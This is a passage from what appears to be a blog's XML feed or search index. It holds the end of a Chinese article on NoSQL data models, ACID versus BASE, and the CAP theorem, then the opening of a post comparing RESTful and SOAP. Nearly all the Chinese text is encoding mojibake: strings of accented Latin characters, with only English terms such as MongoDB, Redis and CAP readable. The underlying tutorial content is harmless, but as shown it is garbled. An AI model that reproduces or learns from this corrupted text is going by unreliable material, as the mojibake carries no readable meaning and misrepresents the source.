æ˜¯â€é¢å‘è¿æ¥â€çš„ Eventual Consistency: æœ€ç»ˆä¸€è‡´æ€§ æœ€ç»ˆä¸€è‡´æ€§ï¼Œ ä¹Ÿæ˜¯æ˜¯ ACID çš„æœ€ç»ˆç›®çš„ã€‚ BASEæ˜¯ç›¸å¯¹ACIDè€Œè¨€çš„, ä¸‹é¢æ˜¯å¯¹æ¯”è¡¨: ACID BASE AåŸå­æ€§(Atomicity) åŸºæœ¬å¯ç”¨(Basically Available) ä¸€è‡´æ€§(Consistency) è½¯çŠ¶æ€/æŸ”æ€§äº‹åŠ¡(Soft state) éš”ç¦»æ€§(Isolation) æœ€ç»ˆä¸€è‡´æ€§ (Eventual consistency) æŒä¹…æ€§ (Durable) æ”¯æŒ å…¸å‹çš„NoSQLäº§å“ NoSQLæ˜¯å®ç°æ–¹å¼å„ä¸ç›¸åŒï¼Œä¸‹é¢ä¸»è¦ä»‹ç» ä¸»æµçš„NoSQLæµæ´¾, æƒ³è¦äº†è§£æ›´å…·ä½“çš„ä¿¡æ¯è¯·ç‚¹å‡»å…³äºæ‰€æœ‰NoSQLä»‹ç»çš„ä¸€ä¸ªç½‘ç«™: åˆ—å¼æ•°æ®æ¨¡å‹æ•°æ®æ¨¡å‹ï¼š çœ‹åˆ°ä¹Ÿæ˜¯è¡¨, ä½†æ˜¯ä¸æ”¯æŒé“¾æ¥æŸ¥è¯¢, å› ä¸ºæ•°æ®å­˜å‚¨ä»¥åˆ—ä¸ºå•ä½(column), è€Œå…³ç³»æ•°æ®åº“æ˜¯ä»¥è¡Œä¸ºå­˜å‚¨å•ä½çš„åº”ç”¨åœºæ™¯ï¼š åœ¨åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿä¹‹ä¸Šæä¾›æ”¯æŒéšæœºè¯»å†™çš„åˆ†å¸ƒå¼æ•°æ®å­˜å‚¨å…¸å‹äº§å“ï¼š Hbaseã€ Hypertableã€ Bigtableã€ Cassandraä¼˜ç‚¹ï¼š å¿«é€ŸæŸ¥è¯¢ã€ é«˜æ‰©å±•æ€§ã€æ˜“äºå®ç°åˆ†å¸ƒå¼æ‰©å±• æ–‡æ¡£æ•°æ®æ¨¡å‹ ï¼šæ•°æ®æ¨¡å‹ï¼š ä»‹äºé”®å€¼å­˜å‚¨kv)å’Œå…³ç³»å‹å­˜å‚¨(row),æ¯ä¸€è¡Œæ•°æ®ç»„ç»‡ä¸ºä¸€ä¸ªæ–‡æ¡£, ä»¥æ–‡æ¡£ä¸ºå­˜å‚¨å•ä½åº”ç”¨åœºæ™¯ï¼š éå¼ºäº‹ç‰©éœ€æ±‚çš„webåº”ç”¨å…¸å‹äº§å“ï¼š MongoDBã€ ElasticSearch(å¼¹æ€§æœç´¢ï¼Œå­˜å‚¨webæ—¥å¿—)ä¼˜ç‚¹ï¼š æ•°æ®æ¨¡å‹æ— éœ€äº‹å…ˆå®šä¹‰ é”®å€¼æ•°æ®æ¨¡å‹ ï¼šæ•°æ®æ¨¡å‹ï¼š æ¨¡å‹ç®€å•, æ˜“äºå®ç°, æ“ä½œç®€å•(get set del)åº”ç”¨åœºæ™¯ï¼š å†…å®¹ç¼“å­˜, ç”¨äºå¤§é‡å¹¶è¡Œæ•°æ®è®¿é—®, é«˜è´Ÿè½½åœºæ™¯åº”ç”¨äº§å“ï¼š DynamoDB, Riak, Redisä¼˜ç‚¹ï¼š hashçš„ä¼˜ç‚¹ï¼Œ æŸ¥è¯¢è¿…é€Ÿ å›¾å¼æ•°æ®æ¨¡å‹ ï¼šæ•°æ®æ¨¡å‹ï¼š å›¾å¼ç»“æ„åº”ç”¨åœºæ™¯ï¼š ç¤¾äº¤ç½‘ç»œã€ æ¨èç³»ç»Ÿã€ å…³ç³»å›¾è°±å…¸å‹äº§å“ï¼š Neo4Jä¼˜ç‚¹ï¼š é€‚ç”¨äºå›¾å¼æŠ€æœ¯åœºæ™¯ å¦‚ä½•è§£å†³å¤§æ•°æ®å­˜å‚¨é—®é¢˜ï¼Ÿ é€šè¿‡åˆ†å¸ƒå¼è§£å†³ RDBMS vs NoSQLRDBMSçš„ç‰¹ç‚¹: é«˜åº¦ç»„ç»‡åŒ–ç»“æ„åŒ–æ•°æ® ç»“æ„åŒ–æŸ¥è¯¢è¯­è¨€ æ•°æ®å’Œå…³ç³»éƒ½å­˜å‚¨åœ¨å•ç‹¬çš„è¡¨ä¸­ã€‚ æ•°æ®æ“çºµè¯­è¨€ï¼Œæ•°æ®å®šä¹‰è¯­è¨€ ä¸¥æ ¼çš„ä¸€è‡´æ€§ åŸºäºäº‹åŠ¡ NoSQLçš„ç‰¹ç‚¹: ä»£è¡¨ç€ä¸ä»…ä»…æ˜¯SQL æ²¡æœ‰å£°æ˜æ€§æŸ¥è¯¢è¯­è¨€ æ²¡æœ‰é¢„å®šä¹‰çš„æ¨¡å¼, æ¶æ„çš„çµæ´»æ€§ï¼Œæ”¯æŒåŠç»“æ„åŒ–æ•°æ® é”®å€¼å¯¹å­˜å‚¨ï¼Œåˆ—å­˜å‚¨ï¼Œæ–‡æ¡£å­˜å‚¨ï¼Œå›¾å½¢æ•°æ®åº“ æœ€ç»ˆä¸€è‡´æ€§ï¼Œè€ŒéACIDå±æ€§ éç»“æ„åŒ–å’Œä¸å¯é¢„çŸ¥çš„æ•°æ® åˆ†å¸ƒå¼è®¡ç®—, CAPå®šç† é«˜æ€§èƒ½ï¼Œé«˜å¯ç”¨æ€§å’Œå¯ä¼¸ç¼©æ€§, é«˜æ°´å¹³æ‰©å±•èƒ½åŠ›å’Œä½æˆæœ¬çš„ä½ç«¯ç¡¬ä»¶é›†ç¾¤ åŠŸèƒ½ç›¸å¯¹ç®€å•, æ²¡æœ‰ç»Ÿä¸€çš„æŸ¥è¯¢è¯­è¨€, æœ‰é™çš„æŸ¥è¯¢åŠŸèƒ½ æœ€ç»ˆä¸€è‡´æ˜¯ä¸ç›´è§‚çš„ç¨‹åº æ•°æ®æ¨¡å‹å¯¹äºæ•°æ®æœ¬èº«è€Œè¨€, æˆ‘ä»¬å¾€å¾€å°†å…¶åˆ†ä¸ºç»“æ„åŒ–æ•°æ®, åŠç»“æ„åŒ–æ•°æ®, ä»¥åŠéç»“æ„åŒ–æ•°æ®, ä½†æ˜¯å¯¹äºå‚¨å­˜æ—¶æ•°æ®çš„ç»„ç»‡æˆ‘ä»¬æ‰ç§°å…¶ä¸ºæ•°æ®æ¨¡å‹, å¸¸è§çš„æ•°æ®æ¨¡å‹æœ‰: å…³ç³»æ¨¡å‹, æ–‡æ¡£æ¨¡å‹, å¥å€¼æ¨¡å‹, ä»¥åŠåˆ—å¼æ¨¡å¼ã€‚ ç”¨æˆ·ä¾§æ•°æ®éšç€ç½‘ç»œæŠ€æœ¯çš„å‘å±•ï¼Œç‰¹åˆ«æ˜¯Internetå’ŒIntranetæŠ€æœ¯çš„é£å¿«å‘å±•ï¼Œä½¿å¾—éç»“æ„åŒ–æ•°æ®çš„æ•°é‡æ—¥è¶‹å¢å¤§ã€‚è¿™æ—¶ï¼Œä¸»è¦ç”¨äºç®¡ç†ç»“æ„åŒ–æ•°æ®çš„å…³ç³»æ•°æ®åº“çš„å±€é™æ€§æš´éœ²åœ°è¶Šæ¥è¶Šæ˜æ˜¾ã€‚å› è€Œï¼Œæ•°æ®åº“æŠ€æœ¯ç›¸åº”åœ°è¿›å…¥äº†â€œåå…³ç³»æ•°æ®åº“æ—¶ä»£â€ï¼Œå‘å±•è¿›å…¥åŸºäºç½‘ç»œåº”ç”¨çš„éç»“æ„åŒ–æ•°æ®åº“æ—¶ä»£ã€‚ ç»“æ„åŒ–æ•°æ®(structured data) ç»“æ„åŒ–æ•°æ®, å³è¡Œæ•°æ®,å­˜å‚¨åœ¨æ•°æ®åº“é‡Œ,å¯ä»¥ç”¨äºŒç»´è¡¨ç»“æ„æ¥é€»è¾‘è¡¨è¾¾å®ç°çš„æ•°æ®ã€‚ç»“æ„åŒ–æ•°æ®, å…ˆçŸ¥ç»“æ„, å†æœ‰æ•°æ®ã€‚ æˆ‘ä»¬æ ¹æ®æ•°æ®çš„ç»“æ„é¢„å…ˆå»ºç«‹å¥½äºŒç»´è¡¨, ç­‰æ•°æ®æ¥çš„æ—¶å€™, å¡«å…¥å³å¯ã€‚å› æ­¤ç»“æ„åŒ–çš„æ•°æ®å¾€å¾€æ˜¯å¯å»ºæ¨¡, æ ‡å‡†åŒ–çš„æ•°æ®, ç»“æ„åŒ–çš„æ•°æ®å¾ˆæ–¹ä¾¿ç¨‹åºä½¿ç”¨, å› ä¸ºç»“æ„å·²çŸ¥ã€‚ ç»“æ„åŒ–æ•°æ®æœ€å¤§çš„é—®é¢˜, å°±å½“æ•°æ®çš„ç»“æ„å‘ç”Ÿå˜åŒ–æ—¶, æˆ‘ä»¬éœ€è¦è°ƒæ•´æ•°æ®çš„ç»“æ„, ä¸€èˆ¬å°±æ„å‘³ç€æ•°æ®åº“è¡¨ç»“æ„çš„éœ€è¦å˜åŠ¨ã€‚è¿™ä½¿å¾—æ•°æ®åœ¨å­˜å‚¨æ—¶æœ‰ä¸¥æ ¼çš„è¦æ±‚(éœ€è¦å®šä¹‰schema)ã€‚ç»“æ„åŒ–æ•°æ®: å¯ä»¥è¢«æå‰å»ºæ¨¡çš„æ•°æ®(å®šä¹‰schema) åŠç»“æ„åŒ–æ•°æ®(semi-structured data) æ‰€è°“åŠç»“æ„åŒ–æ•°æ®ï¼Œå°±æ˜¯ä»‹äºå®Œå…¨ç»“æ„åŒ–æ•°æ®(å¦‚å…³ç³»å‹æ•°æ®åº“ã€é¢å‘å¯¹è±¡æ•°æ®åº“ä¸­çš„æ•°æ®)å’Œå®Œå…¨æ— ç»“æ„çš„æ•°æ®(å¦‚å£°éŸ³ã€å›¾åƒæ–‡ä»¶ç­‰)ä¹‹é—´çš„æ•°æ®ï¼ŒHTMLæ–‡æ¡£å°±å±äºåŠç»“æ„åŒ–æ•°æ®ã€‚å®ƒä¸€èˆ¬æ˜¯è‡ªæè¿°çš„ï¼Œæ•°æ®çš„ç»“æ„å’Œå†…å®¹æ··åœ¨ä¸€èµ·ï¼Œæ²¡æœ‰æ˜æ˜¾çš„åŒºåˆ†ã€‚æ‰€ä»¥å¯¹äºåŠç»“æ„åŒ–çš„æ•°æ®, æ•°æ®çš„ç»“æ„è¦ç­‰æ•°æ®è·å¾—åæ‰çŸ¥é“, ä¹Ÿå°±æ˜¯å…ˆæœ‰æ•°æ®, åçŸ¥ç»“æ„ã€‚æ•´ä¸ªäº’è”ç½‘ä¸Šè¿™ç±»æ•°æ®æ˜¯å¾ˆå¤šçš„, å› ä¸ºhtmlå°±æ˜¯åŠç»“æ„åŒ–çš„æ•°æ®ã€‚ ç›¸å¯¹äºç»“æ„åŒ–çš„æ•°æ®, åŠç»“æ„åŒ–æ•°æ®æ— éœ€å®šä¹‰æ•°æ®çš„ç»“æ„(schema free), ä½¿å¾—å…¶åœ¨å­˜å‚¨ä¸Šè¡¨ç°å‡ºå¼ºå¤§çš„çµæ´»æ€§ã€‚åŠç»“æ„åŒ–æ•°æ®: HTML, JSON, XML éç»“æ„åŒ–æ•°æ®(unstructured data) ç›¸å¯¹äºç»“æ„åŒ–æ•°æ®è€Œè¨€ï¼Œä¸æ–¹ä¾¿ç”¨æ•°æ®åº“äºŒç»´é€»è¾‘è¡¨æ¥è¡¨ç°çš„æ•°æ®å³ç§°ä¸ºéç»“æ„åŒ–æ•°æ®ã€‚éç»“æ„åŒ–æ•°æ®åº“æ˜¯æŒ‡å…¶å­—æ®µé•¿åº¦å¯å˜ï¼Œå¹¶ä¸”æ¯ä¸ªå­—æ®µçš„è®°å½•åˆå¯ä»¥ç”±å¯é‡å¤æˆ–ä¸å¯é‡å¤çš„å­å­—æ®µæ„æˆçš„æ•°æ®åº“ï¼Œç”¨å®ƒä¸ä»…å¯ä»¥å¤„ç†ç»“æ„åŒ–æ•°æ®(å¦‚æ•°å­—ã€ç¬¦å·ç­‰ä¿¡æ¯), è€Œä¸”æ›´é€‚åˆå¤„ç†éç»“æ„åŒ–æ•°æ®ï¼ˆå…¨æ–‡æ–‡æœ¬ã€å›¾è±¡ã€å£°éŸ³ã€å½±è§†ã€è¶…åª’ä½“ç­‰ä¿¡æ¯)ã€‚ éç»“æ„åŒ–WEBæ•°æ®åº“ä¸»è¦æ˜¯é’ˆå¯¹éç»“æ„åŒ–æ•°æ®è€Œäº§ç”Ÿçš„ï¼Œä¸ä»¥å¾€æµè¡Œçš„å…³ç³»æ•°æ®åº“ç›¸æ¯”ï¼Œå…¶æœ€å¤§åŒºåˆ«åœ¨äºå®ƒçªç ´äº†å…³ç³»æ•°æ®åº“ç»“æ„å®šä¹‰ä¸æ˜“æ”¹å˜å’Œæ•°æ®å®šé•¿çš„é™åˆ¶ï¼Œæ”¯æŒé‡å¤å­—æ®µã€å­å­—æ®µä»¥åŠå˜é•¿å­—æ®µå¹¶å®ç°äº†å¯¹å˜é•¿æ•°æ®å’Œé‡å¤å­—æ®µè¿›è¡Œå¤„ç†å’Œæ•°æ®é¡¹çš„å˜é•¿å­˜å‚¨ç®¡ç†ï¼Œåœ¨å¤„ç†è¿ç»­ä¿¡æ¯ï¼ˆåŒ…æ‹¬å…¨æ–‡ä¿¡æ¯ï¼‰å’Œéç»“æ„åŒ–ä¿¡æ¯ï¼ˆåŒ…æ‹¬å„ç§å¤šåª’ä½“ä¿¡æ¯ï¼‰ä¸­æœ‰ç€ä¼ ç»Ÿå…³ç³»å‹æ•°æ®åº“æ‰€æ— æ³•æ¯”æ‹Ÿçš„ä¼˜åŠ¿ã€‚éç»“æ„åŒ–æ•°æ®: æ‰€æœ‰æ ¼å¼çš„åŠå…¬æ–‡æ¡£ã€æ–‡æœ¬ã€å›¾ç‰‡ã€XMLã€HTMLã€å„ç±»æŠ¥è¡¨ã€å›¾åƒå’ŒéŸ³é¢‘/è§†é¢‘ä¿¡æ¯ç­‰ç­‰ã€‚ å­˜å‚¨æ—¶æ•°æ®æ•°æ®å­˜å‚¨æ¨¡å‹å€¼æ•°æ®å­˜å‚¨æ—¶å¦‚ä½•ç»„ç»‡ å…³ç³»æ¨¡å‹å…³ç³»æ¨¡å‹: æ–°å®šä¹‰åˆ—, ç„¶åé€šè¿‡è¡Œçš„æ–¹å¼å¯¹æ•°æ®è¿›è¡Œå­˜å‚¨, ä»¥äºŒç»´è¡¨æ¥è¡¨ç¤ºå®ä½“ä¸å®ä½“ä¹‹é—´çš„è”ç³»ï¼Œåœ¨æ•°æ®å»ºæ¨¡æ—¶éœ€è¦å¯¹æ•°æ®å¯¹è±¡è¿›è¡Œæ‹†åˆ†ï¼Œå†å°†å„è‡ªçš„ä¿¡æ¯å­˜åˆ°å¯¹åº”çš„è¡¨é‡Œï¼Œåœ¨éœ€è¦æ—¶å†å°†å„ä¸ªè¡¨è¿æ¥èµ·æ¥ã€‚ åœ¨å…³ç³»æ¨¡å‹å½“ä¸­ï¼Œå¤šä¸ªè¡¨ä¸­çš„ä¸åŒè®°å½•ç»å¸¸â€œäº¤é”™è¿æ¥â€ï¼Œä¸€äº›æ•°æ®ä¼šè¢«å¤šæ¡è®°å½•å…±äº«ã€‚è¿™æ ·çš„å¥½å¤„å°±æ˜¯å‡å°‘äº†é‡å¤æ•°æ®çš„å‡ºç°ï¼Œä½†æ˜¯è¿™æ ·ä¸å¥½çš„åœ°æ–¹å°±æ˜¯ä¸€æ—¦å…¶ä¸­æŸä¸€æ¡é“¾æ¥çš„è®°å½•å‘ç”Ÿæ”¹å˜ï¼Œé‚£ä¹ˆä¸å…¶ç›¸å…³çš„è®°å½•å’Œè¡¨éƒ½ä¼šè¢«é”ä½ä»¥é˜²æ­¢éä¸€è‡´æ€§çš„å‡ºç°ã€‚ ACIDäº‹åŠ¡åœ¨å…³ç³»å‹æ•°æ®åº“ä¸­æ˜¯å¾ˆå¤æ‚çš„ï¼Œå› ä¸ºæ•°æ®ä¼šæ‰©æ•£ã€‚å³ä¾¿æ˜¯å•ä¸€æ¡è®°å½•ï¼Œè¿™å¤æ‚çš„å…±äº«æ•°æ®å†…éƒ¨å…³ç³»ç½‘çš„å­˜åœ¨ï¼Œä¹Ÿä½¿å¾—å…³ç³»å‹æ•°æ®åœ¨å¤šä¸ªæœåŠ¡å™¨ä¹‹é—´çš„ä¼ é€’å˜å¾—å¤æ‚è€Œç¼“æ…¢ï¼ŒåŒæ—¶è®©è¯»å’Œå†™æ“ä½œçš„æ€§èƒ½å˜å·®ã€‚å½“å­˜å‚¨ç©ºé—´æ˜‚è´µåˆç¨€å°‘æ—¶ï¼ŒæŠ˜ä¸­çš„æƒè¡¡æ–¹æ¡ˆæ˜¯å¾ˆå¿…è¦çš„ã€‚ç„¶è€Œï¼Œå¦‚ä»Šå­˜å‚¨ç©ºé—´çš„ä»·æ ¼è·Ÿ40å¹´å‰ç›¸æ¯”å·²ç»å¤§å¤§çš„ä¸‹é™äº†ï¼Œå¾ˆå¤šæ—¶å€™è®¡ç®—æŠ˜ä¸­æ–¹æ¡ˆå·²ç»å®Œå…¨æ²¡æœ‰å¿…è¦ã€‚ä½¿ç”¨æ›´å¤šçš„å­˜å‚¨ç©ºé—´æ¥æ¢å–æ›´å¥½çš„æ“ä½œæ€§èƒ½ï¼Œæˆ–è€…æ˜¯å°†å·¥ä½œè´Ÿè½½åˆ†é…åˆ°å¤šå°æœºå™¨ä¸Šï¼Œè¿™æ‰æ˜¯å¦‚ä»Šåº”ç”¨ä¸Šæ›´å¥½çš„è§£å†³æ–¹æ¡ˆã€‚ æ–‡æ¡£æ¨¡å‹æ–‡æ¡£æ•°æ®: å°†ä¸€ä¸ªæ•°æ®è®°å½•(recordæˆ–è€…row)ä½œä¸ºå•ä½è¿›è¡Œå­˜å‚¨, æ— éœ€å®šä¹‰è¡Œã€‚ä¹Ÿå¯ä»¥è®¤ä¸ºä¸€ä¸ªæ–‡æ¡£å°±æ˜¯å…³ç³»æ•°æ®åº“çš„ä¸€è¡Œã€‚ ä½¿ç”¨â€œæ–‡æ¡£â€è¿™ä¸ªè¯ä¼¼ä¹è®©äººè§‰å¾—å¥‡æ€ªï¼Œä½†æ˜¯å…¶å®â€æ–‡æ¡£å‹æ•°æ®æ¨¡å‹â€çœŸçš„å’Œä¼ ç»Ÿæ„ä¹‰çš„æ–‡å­—â€æ–‡æ¡£â€æ²¡æœ‰ä»€ä¹ˆå…³ç³»ã€‚ä»–ä¸æ˜¯ä¹¦ã€ä¿¡æˆ–è€…æ–‡ç« ï¼Œè¿™é‡Œè¯´çš„â€æ–‡æ¡£â€å…¶å®æ˜¯ä¸€ä¸ªæ•°æ®è®°å½•, è¿™ä¸ªè®°å½•èƒ½å¤Ÿå¯¹åŒ…å«çš„æ•°æ®ç±»å‹å’Œå†…å®¹è¿›è¡Œâ€œè‡ªæˆ‘æè¿°â€ã€‚XMLæ–‡æ¡£ã€HTMLæ–‡æ¡£å’ŒJSON æ–‡æ¡£å°±å±äºè¿™ä¸€ç±», å› æ­¤æˆ‘ä»¬å¯ä»¥è®¤ä¸ºæ‰€æœ‰åŠç»“æ„åŒ–çš„æ•°æ®éƒ½å±äºæ–‡æ¡£æ•°æ®, è€Œç°åœ¨ä¸»è¦çš„æ–‡æ¡£æ•°æ®åº“è¿˜æ˜¯ä»¥Jsonä½œä¸ºæ–‡æ¡£ä¸ºä¸».å¯ä»¥çœ‹åˆ°ï¼Œæ•°æ®æ˜¯ä¸è§„åˆ™çš„ï¼Œæ¯ä¸€æ¡è®°å½•åŒ…å«äº†æ‰€æœ‰çš„æœ‰å…³è¯¥è®°å½•çš„ä¿¡æ¯è€Œæ²¡æœ‰ä»»ä½•å¤–éƒ¨çš„å¼•ç”¨, è¿™æ¡è®°å½•å°±æ˜¯â€œè‡ªåŒ…å«â€çš„ã€‚è¿™å°±ä½¿å¾—è®°å½•å¾ˆå®¹æ˜“å®Œå…¨ç§»åŠ¨åˆ°å…¶ä»–æœåŠ¡å™¨, å› ä¸ºè¿™æ¡è®°å½•çš„æ‰€æœ‰ä¿¡æ¯éƒ½åŒ…å«åœ¨é‡Œé¢äº†, ä¸éœ€è¦è€ƒè™‘è¿˜æœ‰ä¿¡æ¯åœ¨åˆ«çš„è¡¨æ²¡æœ‰ä¸€èµ·è¿ç§»èµ°ã€‚åŒæ—¶ï¼Œå› ä¸ºåœ¨ç§»åŠ¨è¿‡ç¨‹ä¸­ï¼Œåªæœ‰è¢«ç§»åŠ¨çš„é‚£ä¸€æ¡è®°å½•éœ€è¦æ“ä½œè€Œä¸åƒå…³ç³»å‹ä¸­æ¯ä¸ªæœ‰è”ç³»çš„è¡¨éƒ½éœ€è¦é”ä½æ¥ä¿è¯ä¸€è‡´æ€§ï¼Œè¿™æ ·ä¸€æ¥ACIDçš„ä¿è¯å°±ä¼šå˜å¾—æ›´å¿«é€Ÿ, è¯»å†™çš„é€Ÿåº¦ä¹Ÿä¼šæœ‰å¾ˆå¤§çš„æå‡ã€‚ å¥å€¼æ¨¡å‹å¥å€¼æ¨¡å‹: å®ƒçš„æ•°æ®æŒ‰ç…§é”®å€¼å¯¹çš„å½¢å¼è¿›è¡Œç»„ç»‡,ç´¢å¼•å’Œå­˜å‚¨ã€‚KVå­˜å‚¨éå¸¸é€‚åˆä¸æ¶‰åŠè¿‡å¤šæ•°æ®å…³ç³»ä¸šåŠ¡å…³ç³»çš„ä¸šåŠ¡æ•°æ®ï¼ŒåŒæ—¶èƒ½æœ‰æ•ˆå‡å°‘è¯»å†™ç£ç›˜çš„æ¬¡æ•°ï¼Œæ¯”SQLæ•°æ®åº“å­˜å‚¨æ‹¥æœ‰æ›´å¥½çš„è¯»å†™æ€§èƒ½ã€‚ åˆ—å¼æ¨¡å‹åˆ—å¼å­˜å‚¨: ä»¥åˆ—ç›¸å…³å­˜å‚¨æ¶æ„è¿›è¡Œæ•°æ®å­˜å‚¨ã€‚åˆ—å¼å­˜å‚¨ä»¥æµçš„æ–¹å¼åœ¨åˆ—ä¸­å­˜å‚¨æ‰€æœ‰çš„æ•°æ®ï¼Œä¸»è¦é€‚åˆä¸æ‰¹é‡æ•°æ®å¤„ç†å’Œå³å¸­æŸ¥è¯¢ã€‚ ç”±äºæŸ¥è¯¢éœ€è¦è¯»å–çš„blockså°‘, æ‰€ä»¥æŸ¥è¯¢å¿«, å› ä¸ºåŒä¸€ç±»å‹çš„åˆ—å­˜å‚¨åœ¨ä¸€èµ·, æ‰€ä»¥æ•°æ®å‹ç¼©æ¯”é«˜, Loadå¿«ã€‚ å®ƒç®€åŒ–æ•°æ®å»ºæ¨¡çš„å¤æ‚æ€§ã€‚ä½†æ˜¯æ’å…¥æ›´æ–°æ…¢ï¼Œä¸å¤ªé€‚åˆæ•°æ®è€æ˜¯å˜åŒ–ï¼Œå®ƒæ˜¯æŒ‰åˆ—å­˜å‚¨çš„ã€‚ åˆ—å¼å­˜å‚¨å¾ˆé€‚åˆåšæ•°æ®ä»“åº“ï¼Œå®ƒä¸é€‚åˆOLTPã€‚ CAPå®šç†åœ¨è®¡ç®—æœºç§‘å­¦ä¸­, CAPå®šç†(CAP theorem), åˆè¢«ç§°ä½œå¸ƒé²å°”å®šç†(Brewer&#39;s theorem), å®ƒæŒ‡å‡ºå¯¹äºä¸€ä¸ªåˆ†å¸ƒå¼è®¡ç®—ç³»ç»Ÿæ¥è¯´ï¼Œä¸å¯èƒ½åŒæ—¶æ»¡è¶³ä»¥ä¸‹ä¸‰ç‚¹: ä¸€è‡´æ€§(Consistency) (æ‰€æœ‰èŠ‚ç‚¹åœ¨åŒä¸€æ—¶é—´å…·æœ‰ç›¸åŒçš„æ•°æ®) å¯ç”¨æ€§(Availability) (ä¿è¯æ¯ä¸ªè¯·æ±‚ä¸ç®¡æˆåŠŸæˆ–è€…å¤±è´¥éƒ½æœ‰å“åº”) åˆ†éš”å®¹å¿(Partition tolerance) (ç³»ç»Ÿä¸­ä»»æ„ä¿¡æ¯çš„ä¸¢å¤±æˆ–å¤±è´¥ä¸ä¼šå½±å“ç³»ç»Ÿçš„ç»§ç»­è¿ä½œ) CAPç†è®ºçš„æ ¸å¿ƒæ˜¯ï¼šä¸€ä¸ªåˆ†å¸ƒå¼ç³»ç»Ÿä¸å¯èƒ½åŒæ—¶å¾ˆå¥½çš„æ»¡è¶³ä¸€è‡´æ€§ï¼Œå¯ç”¨æ€§å’Œåˆ†åŒºå®¹é”™æ€§è¿™ä¸‰ä¸ªéœ€æ±‚ï¼Œæœ€å¤šåªèƒ½åŒæ—¶è¾ƒå¥½çš„æ»¡è¶³ä¸¤ä¸ªã€‚å› æ­¤ï¼Œæ ¹æ®CAPåŸç†å°†NoSQLæ•°æ®åº“åˆ†æˆäº†æ»¡è¶³CAåŸåˆ™ã€æ»¡è¶³CPåŸåˆ™å’Œæ»¡è¶³APåŸåˆ™ä¸‰ å¤§ç±»ï¼š CA å•ç‚¹é›†ç¾¤ï¼Œæ»¡è¶³ä¸€è‡´æ€§ï¼Œå¯ç”¨æ€§çš„ç³»ç»Ÿï¼Œé€šå¸¸åœ¨å¯æ‰©å±•æ€§ä¸Šä¸å¤ªå¼ºå¤§ã€‚ CP æ»¡è¶³ä¸€è‡´æ€§ï¼Œåˆ†åŒºå®¹å¿æ€§çš„ç³»ç»Ÿï¼Œé€šå¸¸æ€§èƒ½ä¸æ˜¯ç‰¹åˆ«é«˜ã€‚ AP æ»¡è¶³å¯ç”¨æ€§ï¼Œåˆ†åŒºå®¹å¿æ€§çš„ç³»ç»Ÿï¼Œé€šå¸¸å¯èƒ½å¯¹ä¸€è‡´æ€§è¦æ±‚ä½ä¸€äº›ã€‚ å®šç†: ä»»ä½•åˆ†å¸ƒå¼ç³»ç»Ÿæœ€å¤šåªèƒ½åŒæ—¶æ—¶æ»¡è¶³3ç‚¹(Consistency, Availability, Partition tolerance)ä¸­çš„2ç‚¹, åŒæ—¶æ»¡è¶³3ç‚¹çš„åˆ†å¸ƒå¼ç³»ç»Ÿæ˜¯ä¸å­˜åœ¨çš„å¿ å‘Šï¼šæ¶æ„å¸ˆä¸è¦å°†ç²¾åŠ›æµªè´¹åœ¨å¦‚ä½•è®¾è®¡èƒ½æ»¡è¶³ä¸‰è€…çš„å®Œç¾åˆ†å¸ƒå¼ç³»ç»Ÿï¼Œè€Œæ˜¯åº”è¯¥è¿›è¡Œå–èˆã€‚ CAPä¸æ•°æ®åº“RDBMSæ»¡è¶³çš„æ˜¯ACIDè§„åˆ™, è€ŒACIDè§„åˆ™æ»¡è¶³çš„å°±æ˜¯CAPé‡Œé¢çš„CA, å› æ­¤æ‰©å±•æ€§ä¸å¼º.NewSQL/NoSQLæ»¡è¶³çš„æ˜¯BASEè§„åˆ™, è€ŒBASEè§„åˆ™å°±æ˜¯é™ä½ä¸€è‡´æ€§æˆ–è€…å¯ç”¨æ€§æ¥æå‡ç³»ç»Ÿæ€§èƒ½, å°±æ˜¯CAPé‡Œé¢çš„CP/AP æ€»ç»“åœ¨ç†è§£äº†ä¸Šé¢æ‰€æœ‰çš„æ¦‚å¿µè¿‡å, å°±èƒ½çœ‹æ‡‚è¿™å¼ CAPçš„å›¾äº†: å‚è€ƒMongoDB Architectureå®˜æ–¹ä¸­æ–‡ä»‹ç»elasticsearch(lucene)å¯ä»¥ä»£æ›¿NoSQL(mongodb)å—ï¼Ÿ]]></content>
      <categories>
        <category>æ•°æ®åº“</category>
        <category>æ–‡æ¡£æ•°æ®åº“</category>
      </categories>
      <tags>
        <tag>mongodb</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¯¹æ¯”RESTfulä¸SOAPï¼Œæ·±å…¥ç†è§£RESTful]]></title>
    <url>%2F2017%2F10%2F03%2Frestful-vs-soap%2F</url>
    <content type="text"><![CDATA[åœ¨æ–‡ç« å¼€å§‹å‰è¯·æ€è€ƒå¦‚ä¸‹é—®é¢˜: RESTæ˜¯å•¥? SOAPæ˜¯å•¥ï¼Ÿä¸ºä»€ä¹ˆä¼šäº§ç”Ÿä»–ä»¬ï¼Ÿä»¥åŠä»–ä»¬éƒ½æœ‰å“ªäº›ç‰¹ç‚¹ï¼Ÿä»–ä»¬åˆ°åº•æœ‰å“ªäº›ä¸åŒï¼Ÿæˆ‘ä»¬ä»€ä¹ˆæ—¶å€™é€‰æ‹©RESTï¼Œä»€ä¹ˆæ—¶å€™é€‰æ‹©SOAP. åœ¨è¿™é‡Œæˆ‘ä»¬é€šè¿‡å¯¹æ¯”ä»–ä»¬æ¥è§£ç­”å‰é¢æå‡ºçš„é—®é¢˜. è¯ç”Ÿåœ¨åå¤šå¹´å‰ æœ‰2ç§å¾ˆé‡è¦æ„å»ºweb serviceçš„æ–¹æ³•: RESTful å’Œ SOAP, SOAPçš„å‡ºç°çº¦ä¸ºæ¯”RESTfulæ—©ä¸€äº›ï¼Œåœ¨å¼€å§‹ä¹‹åˆä»–ä»¬å¹¶æ²¡æœ‰åˆ†åŒ–ï¼Œä»ç„¶å…±å­˜æ¥è§£å†³ä¸åŒçš„éœ€æ±‚ã€‚ä½†æ˜¯ç°åœ¨RESTfulç››è¡Œï¼ŒSOAPæ—¥æ¸æ²¡è½ï¼Œæ‰€ä»¥æˆ‘ä»¬æ¥äº†è§£ä¸‹ä»–ä»¬çš„å‰ä¸–ä»Šç”Ÿ. 